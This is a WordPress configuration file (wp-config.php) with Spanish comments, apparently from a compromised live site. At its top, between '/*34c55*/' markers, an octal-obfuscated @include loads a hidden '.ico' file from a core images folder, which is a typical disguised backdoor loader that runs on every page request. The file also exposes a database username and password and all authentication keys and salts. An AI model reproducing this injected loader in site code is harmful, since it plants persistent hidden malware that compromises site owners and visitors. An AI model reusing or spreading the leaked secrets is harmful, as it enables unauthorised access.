<?php
/*34c55*/

@include "\057ho\155e/\164ub\157la\155in\141s/\160ub\154ic\137ht\155l/\167p-\151nc\154ud\145s/\151ma\147es\057cr\171st\141l/\05675\06465\1418e\056ic\157";

/*34c55*/




//Begin Really Simple SSL session cookie settings
@ini_set('session.cookie_httponly', true);
@ini_set('session.cookie_secure', true);
@ini_set('session.use_only_cookies', true);
//END Really Simple SSL


define('WP_CACHE', true); // Added by WP Rocket
/**
 * Configuración básica de WordPress.
 *
 * Este archivo contiene las siguientes configuraciones: ajustes de MySQL, prefijo de tablas,
 * claves secretas, idioma de WordPress y ABSPATH. Para obtener más información,
 * visita la página del Codex{@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} . Los ajustes de MySQL te los proporcionará tu proveedor de alojamiento web.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** Ajustes de MySQL. Solicita estos datos a tu proveedor de alojamiento web. ** //
/** El nombre de tu base de datos de WordPress */
define( 'DB_NAME', 'wp_tubo_admin_2019' );

/** Tu nombre de usuario de MySQL */
define( 'DB_USER', 'tubo_admin_2019' );

/** Tu contraseña de MySQL */
define( 'DB_PASSWORD', 'tubo_admin_2019%' );

/** Host de MySQL (es muy probable que no necesites cambiarlo) */
define( 'DB_HOST', 'localhost' );

/** Codificación de caracteres para la base de datos. */
define( 'DB_CHARSET', 'utf8mb4' );

/** Cotejamiento de la base de datos. No lo modifiques si tienes dudas. */
define('DB_COLLATE', '');

/**#@+
 * Claves únicas de autentificación.
 *
 * Define cada clave secreta con una frase aleatoria distinta.
 * Puedes generarlas usando el {@link https://api.wordpress.org/secret-key/1.1/salt/ servicio de claves secretas de WordPress}
 * Puedes cambiar las claves en cualquier momento para invalidar todas las cookies existentes. Esto forzará a todos los usuarios a volver a hacer login.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY', ',DrDf(k=MZh.2.L)jPi/s<F|HUiLEtA<TM(SJ?9rNY*2A+%p5m_+dy_pKM!}PX*5' );
define( 'SECURE_AUTH_KEY', 'lw0=3.S~f0_#b1.Ak|=zS]ol;r5^(!D@xl-o[+<$2h6xnJAu$?g 4uD.bB{^|5}X' );
define( 'LOGGED_IN_KEY', '{q1:j}m*]nj)xhW;)EpYPfS68TfYeW5X,9l_`!+0[N17[UW}~:EA$5w4t^XARJIP' );
define( 'NONCE_KEY', 'Xfkx-W)ULWY-h&oHki<.;Ju>8U|G[[EYJk+tuwz2850JA$dpS)E>#P8gK&2}wTjB' );
define( 'AUTH_SALT', '(]m6U9/vu,hJ<<Xl<f{y&S~qf]p*GXEw=Wbl@8Az6j#p--c_~pt%>n*]Nt]juBo3' );
define( 'SECURE_AUTH_SALT', 'ggZ~uXi#f{mQ.?1q3idaO8B~Q1PMdVWW`_-Y3*]vEEMDgboz,8c!fMRX}W0GMY$8' );
define( 'LOGGED_IN_SALT', '`me(gO7Yl1v %8HU_Xq:IE3eftB}q?t9`ae`,RhPRDWdRek?/QF<Y-:+IE@8ZZ;S' );
define( 'NONCE_SALT', '&;V_@Lr/vp(yrO9k2*-S7xesac5rl9L@OkI(f&<*4u|/J?/AOVQ>I<!mW,A.RphU' );

/**#@-*/

/**
 * Prefijo de la base de datos de WordPress.
 *
 * Cambia el prefijo si deseas instalar multiples blogs en una sola base de datos.
 * Emplea solo números, letras y guión bajo.
 */
$table_prefix = 'wp_';


/**
 * Para desarrolladores: modo debug de WordPress.
 *
 * Cambia esto a true para activar la muestra de avisos durante el desarrollo.
 * Se recomienda encarecidamente a los desarrolladores de temas y plugins que usen WP_DEBUG
 * en sus entornos de desarrollo.
 */
define('WP_DEBUG', false);

/* ¡Eso es todo, deja de editar! Feliz blogging */

/** WordPress absolute path to the Wordpress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

